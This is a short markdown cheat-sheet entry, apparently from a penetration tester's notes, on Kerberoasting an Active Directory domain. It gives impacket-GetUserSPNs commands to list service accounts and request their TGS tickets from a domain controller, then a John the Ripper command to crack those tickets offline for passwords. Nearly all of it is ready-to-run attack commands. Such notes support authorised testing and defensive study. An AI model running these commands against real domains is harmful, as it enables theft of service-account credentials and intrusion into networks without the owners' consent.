---
label: Kerberoasting
disabled: true
---

# Kerberoasting

Linux:

```bash
# Get list of kerberoastable users from DC
impacket-GetUserSPNs $domain/$user:$pass -dc-ip $dc_ip

# Request TGS for kerberoastable users
impacket-GetUserSPNs $domain/$user:$pass -dc-ip $dc_ip -request
```

## Crack TGS offline

```bash
john --format=krb5tgs --wordlist=$wordlist $tgs_file
```
